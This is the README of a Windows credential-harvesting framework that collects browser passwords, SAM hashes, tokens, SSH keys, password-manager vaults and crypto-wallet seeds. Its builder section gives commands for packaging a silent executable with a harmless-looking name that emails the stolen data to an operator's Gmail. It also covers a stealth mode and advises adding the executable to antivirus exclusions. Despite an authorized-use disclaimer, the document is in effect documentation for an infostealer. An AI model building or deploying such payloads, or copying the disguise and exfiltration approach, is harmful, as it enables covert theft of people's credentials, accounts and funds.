<p align="center">
  <img src="steelfox/assets/image-steel-fox.png" alt="SteelFox Banner" width="50%" />
</p>

<h1 align="center">SteelFox</h1>
<p align="center"><strong>Advanced Windows Credential & Reconnaissance Framework</strong></p>

<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.3.1-orange?style=for-the-badge" />
  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows" />
  <img alt="Python" src="https://img.shields.io/badge/python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img alt="Modules" src="https://img.shields.io/badge/modules-112-6e40c9?style=for-the-badge" />
  <img alt="Categories" src="https://img.shields.io/badge/categories-12-2ea043?style=for-the-badge" />
  <img alt="License" src="https://img.shields.io/badge/license-LGPL--3.0-blue?style=for-the-badge" />
</p>

<p align="center">
  <a href="#overview">Overview</a> •
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#coverage">Coverage</a> •
  <a href="#builder--payload-generator">Builder</a> •
  <a href="#architecture">Architecture</a> •
  <a href="#outputs--reports">Outputs</a> •
  <a href="#roadmap">Roadmap</a> •
  <a href="#legal-disclaimer">Legal</a>
</p>

---

## Overview

**SteelFox** is a modern, research-grade credential recovery and system reconnaissance framework designed for **authorized** security auditing on **Windows** systems. Built in Python 3.10+, it provides deep extraction of credentials, tokens, sessions, and operational intelligence from over 112 sources across 12 categories.

### Use Cases

| Context                    | Description                                       |
| -------------------------- | ------------------------------------------------- |
| 🔐 **Penetration Testing** | Credential recovery during authorized engagements |
| 🎓 **Academic Research**   | Cybersecurity lab work and academic study         |
| 🏢 **Internal Audits**     | Assess credential hygiene in your organization    |
| 🧪 **Security Labs**       | Controlled testing environments                   |

---

## Features

- **112 modules** across **12 categories** — browsers, messaging, mail, passwords, cloud, gaming, devtools, network, sysadmin, databases, Windows internals, and reconnaissance
- **Modern crypto support** — Chromium AES-GCM + DPAPI, Firefox NSS, modern vault formats
- **Three report formats** — JSON (machine-readable), TXT (operator-friendly), HTML (polished dark-theme dashboard)
- **Stealth mode** — silent background execution with no console window
- **Progress bar UI** — real-time percentage display during scan
- **Auto-discovery module system** — drop a new module file and it's automatically loaded
- **Multi-user scanning** — scans all user profiles when running as Administrator
- **Builder tool** — generate self-contained `.exe` payloads with built-in email reporting
- **CLI + GUI** — full command-line interface and graphical builder
- **`pip install`** support — install as a proper Python package

---

## Installation

### Prerequisites

| Requirement       | Details                                                                           |
| ----------------- | --------------------------------------------------------------------------------- |
| **Python**        | 3.10 or later                                                                     |
| **OS (runtime)**  | Windows 10 / 11                                                                   |
| **OS (building)** | Windows (or Linux for builder via CI — see [Builder section](#building-on-linux)) |
| **Privileges**    | Administrator recommended for full coverage                                       |

### Option 1: pip install (recommended)

```bash
# Clone the repo
git clone https://github.com/Tiger-Foxx/fox-steel.git
cd fox-steel

# Install core (for running SteelFox on Windows)
pip install .

# Or install in editable/dev mode
pip install -e .

# Install with builder dependencies (Pillow + PyInstaller)
pip install ".[builder]"

# Install everything
pip install ".[all]"
```

After installation, `steelfox` is available as a command:

```bash
steelfox --help
steelfox all
steelfox browsers -oH
```

### Option 2: Manual install (requirements.txt)

```bash
git clone https://github.com/Tiger-Foxx/fox-steel.git
cd fox-steel
pip install -r requirements.txt
python steelfox.py --help
```

### Option 3: Standalone executable (no Python needed)

Download the latest `steelfox_console.exe` from the [Releases](https://github.com/Tiger-Foxx/fox-steel/releases) page. No installation required — just run it:

```powershell
.\steelfox_console.exe all -oH
```

> **Note on Antivirus:** SteelFox executables may trigger false positives due to their credential extraction capabilities. This is expected for security tools. Add the executable to your AV exclusions or run in a controlled environment.

---

## Usage

### On Windows (primary platform)

SteelFox is designed to run natively on Windows. You can use either the Python script or installed command:

```powershell
# List all available modules
steelfox --list-modules
# or: python steelfox.py --list-modules

# Run ALL modules (full scan)
steelfox all

# Run a specific category
steelfox browsers
steelfox reconnaissance
steelfox windows

# Generate an HTML report
steelfox all -oH

# Generate all report formats into a folder
steelfox all -oA -output .\reports

# JSON report for a specific category
steelfox messaging -oJ

# Quiet mode (suppress banner and per-module output)
steelfox all -q -oH

# Verbose / debug output
steelfox all -v
steelfox all -vv

# Stealth mode (hide console, silent, HTML report only)
steelfox all --stealth -oH -output .\loot

# Supply a master password (e.g. for Firefox master pw, KeePass)
steelfox all --password "MyMasterPw"
```

### On Linux (builder mode only — for now)

SteelFox credential recovery is **Windows-only** at this time. However, Linux users can:

1. **Build Windows payloads** using the CLI builder + GitHub Actions CI (no Windows required)
2. **Install the package** in preparation for future Linux module support

```bash
# Install on Linux
pip install ".[builder]"

# Use the CLI builder (headless, no GUI required)
python builder_cli.py \
  --receiver you@gmail.com \
  --sender   you@gmail.com \
  --password "abcd efgh ijkl mnop" \
  --name     SysHealthCheck \
  --output   ./dist
```

> ⚠️ **Important:** PyInstaller does **not** support cross-compilation. The `.exe` can only be produced on a Windows machine (or a Windows CI runner). See [Building on Linux](#building-on-linux) for the GitHub Actions workflow.

### CLI Reference

| Flag                                 | Description                                          |
| ------------------------------------ | ---------------------------------------------------- |
| `all` / `browsers` / `windows` / ... | Module category to run (default: `all`)              |
| `-oJ` / `--json`                     | JSON output                                          |
| `-oN` / `--txt`                      | TXT output                                           |
| `-oH` / `--html`                     | HTML output (dark-themed dashboard)                  |
| `-oA` / `--all-formats`              | All output formats (JSON + TXT + HTML)               |
| `-output <dir>`                      | Output directory (default: current dir)              |
| `-p <password>`                      | Master password (Firefox master pw, vault passwords) |
| `-q` / `--quiet`                     | Suppress banner and per-module console output        |
| `-s` / `--stealth`                   | Stealth mode: hide console, silent, HTML only        |
| `-v` / `-vv`                         | Verbose / debug logging                              |
| `--list-modules`                     | List all available modules and exit                  |
| `--version`                          | Show version and exit                                |

---

## Coverage

### Categories & Modules (112 modules, 12 categories)

| Category           | Count | Modules                                                                                                                                                                                                                                                                                     |
| ------------------ | ----: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Browsers**       |     2 | Chromium Browsers, Firefox & Mozilla Browsers                                                                                                                                                                                                                                               |
| **Cloud**          |     4 | OneDrive, Google Drive, Dropbox, MEGA                                                                                                                                                                                                                                                       |
| **Databases**      |     5 | MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T                                                                                                                                                                                                                                      |
| **DevTools**       |    21 | Git, SSH Keys, Docker, AWS CLI, Azure CLI, NPM, VS Code, JetBrains IDEs, Postman, Insomnia, GCP / gcloud, Kubernetes, GitHub CLI, Terraform, Maven, Composer, PyPI, NuGet, ngrok, Helm, HashiCorp Vault                                                                                     |
| **Gaming**         |    15 | Steam, Epic Games, Battle.net, OBS Studio, StreamLabs, Spotify, Exodus Wallet, Electrum Wallet, Atomic Wallet, Coinomi Wallet, Bitcoin Core, Ethereum Keystore, MetaMask, Brave Wallet, Wasabi Wallet                                                                                       |
| **Mails**          |     3 | Outlook, Thunderbird, Mailbird                                                                                                                                                                                                                                                              |
| **Messaging**      |     8 | Discord, Slack, Microsoft Teams, Signal, Skype, WhatsApp, Telegram, Telegram Desktop Sessions                                                                                                                                                                                               |
| **Network**        |     9 | WiFi Networks, OpenVPN, NordVPN, ProtonVPN, WireGuard, Cisco AnyConnect, FortiClient VPN, GlobalProtect VPN, Tailscale                                                                                                                                                                      |
| **Passwords**      |     4 | KeePass, Bitwarden, 1Password, LastPass                                                                                                                                                                                                                                                     |
| **Reconnaissance** |    17 | System Information, Network Recon, Installed Software, Running Processes, Security Software, Startup Programs, USB History, Clipboard, RDP History, User Privileges, Recent Files, Scheduled Tasks, Active Connections, Shared Folders, Defender Exclusions, WiFi Profiles List, Hosts File |
| **Sysadmin**       |    14 | FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP Connection Manager, CoreFTP, IIS App Pool, IIS Central Cert Store, AnyDesk, TeamViewer, WSL                                                                                                                                |
| **Windows**        |    10 | Credential Manager, Windows Autologon, Windows Vault, DPAPI Credential Files, SAM Hashdump, Unattended Config, Environment Secrets, PowerShell History, Saved RDP Files, Tortoise SVN                                                                                                       |

### Data Types Recovered

- Account credentials (username/password)
- API / OAuth / PAT tokens and session material
- Browser secrets (passwords, cookies, autofill, cards, history, bookmarks)
- Windows secrets (Credential Manager, Vault, DPAPI blobs, SAM hashes)
- Developer & cloud authentication traces (SSH keys, Docker configs, cloud CLI tokens)
- Cryptocurrency wallet data (seeds, keystores)
- System and network reconnaissance artifacts

---

## Builder & Payload Generator

The **SteelFox Builder** packages the entire framework into a self-contained `.exe` that runs silently on a target machine and emails back an HTML report.

<p align="center">
  <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
</p>

### How the Builder Works

1. Takes your **SMTP credentials** (sender Gmail + app password) and **recipient email**
2. Packages the SteelFox engine + your encoded credentials into a single `.exe`
3. The generated executable, when run on a target:
   - Runs **silently** in the background (no console, no window)
   - Collects all credentials and system data
   - Generates an HTML report
   - Sends the report to your email automatically
   - Saves a local cache in `%TEMP%\sys_diag_cache.html`

### Builder Methods

| Method                    | OS                | GUI Required     | Best For                     |
| ------------------------- | ----------------- | ---------------- | ---------------------------- |
| `python builder.py`       | Windows           | ✅ Yes (Tkinter) | Interactive use              |
| `python builder_cli.py`   | Windows / Linux\* | ❌ No            | Automation, CI/CD            |
| `python build_builder.py` | Windows           | —                | Build `steelfox_builder.exe` |
| GitHub Actions            | Any               | ❌ No            | Remote builds from any OS    |

_\*Linux can run the CLI builder, but PyInstaller requires a Windows host to produce `.exe` files._

### Builder GUI (Windows)

```powershell
pip install -r requirements.txt
python builder.py
```

| Field                | Description                                          |
| -------------------- | ---------------------------------------------------- |
| **Output name**      | Name of the generated `.exe` (e.g. `SysHealthCheck`) |
| **Icon**             | Optional `.ico` or image file for the executable     |
| **Recipient email**  | Email address that will receive the report           |
| **Sender email**     | Gmail address used to send the report                |
| **App password**     | Gmail App Password (16-char code, see below)         |
| **Output directory** | Where to save the generated `.exe`                   |

### Builder CLI (headless)

```bash
python builder_cli.py \
  --receiver you@gmail.com \
  --sender   you@gmail.com \
  --password "abcd efgh ijkl mnop" \
  --name     SysHealthCheck \
  --output   ./dist
```

Environment variables are also supported:

| Variable      | Description                              |
| ------------- | ---------------------------------------- |
| `SF_RECEIVER` | Recipient email                          |
| `SF_SENDER`   | Sender Gmail (defaults to `SF_RECEIVER`) |
| `SF_PASSWORD` | Gmail App Password                       |
| `SF_NAME`     | Output exe name (default: `output`)      |
| `SF_OUTPUT`   | Output directory (default: current dir)  |

### Building on Linux

PyInstaller does **not** support cross-compilation. To produce Windows `.exe` files from Linux, use the **GitHub Actions CI/CD pipeline**:

```bash
# Tag and push to trigger a release build on a Windows runner
git tag -a v1.3.1 -m "Release v1.3.1"
git push origin v1.3.1
```

To also build a **payload exe** from the pipeline, set these GitHub Secrets:

| Secret        | Value                      |
| ------------- | -------------------------- |
| `SF_RECEIVER` | Recipient email            |
| `SF_SENDER`   | Sender Gmail               |
| `SF_PASSWORD` | Gmail App Password         |
| `SF_NAME`     | Output exe name (optional) |

Or trigger manually via **Actions → Run workflow** and fill in the inputs.

### Gmail App Password Setup

The builder requires a **Gmail App Password** (not your regular account password):

1. Go to [Google Account Security](https://myaccount.google.com/security)
2. Enable **2-Step Verification**
3. Go to **App passwords** and create a new one (name it anything)
4. Use the generated 16-character code as the password in the builder

### Standalone Builder Executable

A pre-built `steelfox_builder.exe` is available on the [Releases](https://github.com/Tiger-Foxx/fox-steel/releases) page — no Python required. To rebuild it yourself:

```powershell
python build_builder.py
```

---

## Outputs & Reports

SteelFox generates reports in three formats:

| Format   | Flag  | Description                                                                                |
| -------- | ----- | ------------------------------------------------------------------------------------------ |
| **HTML** | `-oH` | Dark-themed dashboard with search, filtering, click-to-reveal passwords, copy-to-clipboard |
| **JSON** | `-oJ` | Structured machine-readable output for automation                                          |
| **TXT**  | `-oN` | Plaintext operator-friendly report for quick review                                        |
| **All**  | `-oA` | Generates HTML + JSON + TXT simultaneously                                                 |

### Report Features

- Multi-user aggregation (separate sections per user profile)
- Category and module grouping
- Timestamped output files (`steelfox_report_YYYYMMDD_HHMMSS.*`)
- UTF-8 encoding with proper handling of special characters
- Sensitive data masking with click-to-reveal in HTML reports
- Interactive search and filtering in HTML reports

### HTML Report Preview

<p align="center">
  <img src="steelfox/assets/screen-shoot-steel-fox-html-report.png" alt="SteelFox HTML Report" width="95%" />
</p>

The HTML report features a sleek **"Jet Black"** dashboard design:

- **Left sidebar** — Category navigation with result count badges (Browsers, Recon, Dev Tools, Windows, Messaging, Network, Cloud, Databases…). The currently selected category is highlighted in orange.
- **Top bar** — Displays the scanned **hostname**, **scan date/time**, and **SteelFox version** at a glance.
- **Main panel** — Results are organized by category, each showing the total number of recovered items. Inside each category, **expandable module cards** list individual sources (e.g. _Windows Vault_, _DPAPI Credential Files_, _Slack_, _Telegram_, _Discord_, _WiFi Networks_, _OneDrive_…) with color-coded status labels.
- **Interactive features** — A search/filter bar at the top left lets you quickly find specific modules or credentials. Passwords are masked by default with a **click-to-reveal** mechanism, and a **copy-to-clipboard** button is available on every credential entry.

The entire report is a single self-contained `.html` file — no external dependencies, works offline in any browser.

---

## Architecture

```text
SteelFox/
├── steelfox.py              # Main CLI entry point
├── steelfox_cli.py           # pip console_scripts wrapper
├── setup.py                  # pip install support
├── requirements.txt          # Dependencies
├── builder.py                # GUI payload builder (Tkinter)
├── builder_cli.py            # Headless CLI payload builder
├── build_console.py          # Build steelfox_console.exe
├── build_builder.py          # Build steelfox_builder.exe
│
├── steelfox/                 # Core package
│   ├── core/
│   │   ├── config.py         # Global configuration & runtime state
│   │   ├── module_base.py    # Abstract base class for all modules
│   │   ├── module_loader.py  # Auto-discovery of modules
│   │   ├── runner.py         # Scan execution engine
│   │   ├── output.py         # Report generation (HTML/JSON/TXT)
│   │   ├── privileges.py     # Admin detection & user enumeration
│   │   └── winapi.py         # Win32 API wrappers (DPAPI, registry, etc.)
│   │
│   ├── modules/              # All recovery/recon modules
│   │   ├── browsers/         # Chromium, Firefox
│   │   ├── messaging/        # Discord, Slack, Teams, Signal, etc.
│   │   ├── mails/            # Outlook, Thunderbird, Mailbird
│   │   ├── passwords/        # KeePass, Bitwarden, 1Password, LastPass
│   │   ├── cloud/            # OneDrive, GDrive, Dropbox, MEGA
│   │   ├── gaming/           # Steam, Epic, crypto wallets
│   │   ├── devtools/         # Git, SSH, Docker, AWS, VS Code, etc.
│   │   ├── network/          # WiFi, VPN clients
│   │   ├── sysadmin/         # FileZilla, PuTTY, WinSCP, etc.
│   │   ├── databases/        # MySQL, DBeaver, HeidiSQL, etc.
│   │   ├── windows/          # Credential Manager, SAM, DPAPI, etc.
│   │   └── reconnaissance/   # System info, processes, network recon
│   │
│   └── assets/               # Logos, icons, images
│
├── .github/workflows/        # CI/CD pipeline
│   └── steelfox_release.yml  # Build & release on tag push
│
├── version_builder.txt       # VERSIONINFO for builder exe
├── version_console.txt       # VERSIONINFO for console exe
├── version_payload.txt       # VERSIONINFO for generated payloads
├── CHANGELOG.md
├── CODE_OF_CONDUCT.md
└── LICENSE                   # LGPL-3.0
```

### Design Principles

- **Modular & typed** — every module inherits from `ModuleBase` with typed metadata
- **Auto-discovery** — drop a `.py` file into `modules/<category>/` and it's loaded automatically
- **Deferred execution** — context-sensitive modules (DPAPI, WinAPI) run at optimal timing
- **Separation of concerns** — collection engine, reporting layer, and UI are fully independent
- **Category-driven** — scan all modules, or target specific categories

### Execution Flow

```text
steelfox.py → runner.py → module_loader.py → [modules] → output.py → reports
                 │
                 ├── System modules (admin-only, run first)
                 ├── Current user modules
                 ├── Other users modules (if admin)
                 └── Deferred modules (DPAPI/WinAPI, run last)
```

---

## Roadmap

| Status     | Feature                                                                                                           |
| ---------- | ----------------------------------------------------------------------------------------------------------------- |
| ✅ Done    | Windows credential recovery (112 modules)                                                                         |
| ✅ Done    | HTML / JSON / TXT reporting                                                                                       |
| ✅ Done    | GUI & CLI builder with email reporting                                                                            |
| ✅ Done    | GitHub Actions CI/CD pipeline                                                                                     |
| ✅ Done    | `pip install .` support (`setup.py`)                                                                              |
| 🔜 Planned | **Linux credential recovery modules** (Firefox, Chrome, WiFi, SSH, GNOME Keyring, KWallet, GPG, cloud CLI tokens) |
| 🔜 Planned | Native Linux binary generation (no Wine/PyInstaller cross-compile needed)                                         |
| 🔜 Planned | macOS credential recovery modules                                                                                 |
| 💡 Ideas   | Plugin system for community-contributed modules                                                                   |
| 💡 Ideas   | Web-based report viewer                                                                                           |

---

## Contributing

Contributions are welcome! To add a new module:

1. Create a new `.py` file in the appropriate `steelfox/modules/<category>/` directory
2. Define a class inheriting from `ModuleBase` with a `meta` attribute and `run()` method
3. The module will be auto-discovered — no registration needed

```python
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

class MyNewModule(ModuleBase):
    meta = ModuleMeta(
        name="My Module",
        category=Category.BROWSERS,
        description="Recovers credentials from MyApp",
    )

    def run(self) -> list[dict]:
        results = []
        # ... your recovery logic ...
        return results
```

---

## Legal Disclaimer

SteelFox must be used **only** in authorized contexts:

- ✅ Internal security assessments with **written approval**
- ✅ Academic / lab environments **you control**
- ✅ Contracted penetration testing engagements
- ❌ Unauthorized access, credential collection, or lateral use is **illegal and unethical**

You are solely responsible for lawful operation. The author assumes no liability for misuse.

---

## Author

<p align="left">
  <img src="https://avatars.githubusercontent.com/u/118616410?v=4" alt="Fox GitHub Avatar" width="74" style="border-radius:50%;" />
</p>

- **Fox** — [@Tiger-Foxx](https://github.com/Tiger-Foxx)
- Version: **1.3.1**

---

## Tech Stack

<p>
  <img alt="Python" src="https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white" />
  <img alt="PyCryptodome" src="https://img.shields.io/badge/PyCryptodome-0C7BDC?style=flat-square&logo=securityscorecard&logoColor=white" />
  <img alt="SQLite" src="https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white" />
  <img alt="Windows API" src="https://img.shields.io/badge/Win32%20API-0078D6?style=flat-square&logo=windows&logoColor=white" />
  <img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" />
  <img alt="PyInstaller" src="https://img.shields.io/badge/PyInstaller-FFDA44?style=flat-square&logo=python&logoColor=black" />
  <img alt="GitHub Actions" src="https://img.shields.io/badge/GitHub%20Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white" />
</p>

---

<p align="center">
  <img src="steelfox/assets/logo-steel-fox-icon.png" alt="SteelFox Logo" width="58" />
</p>

<p align="center">
  <strong>SteelFox</strong> — professional credential auditing for authorized security operations.
</p>

<p align="center">
  Built with precision by <strong>Fox</strong>.
</p>
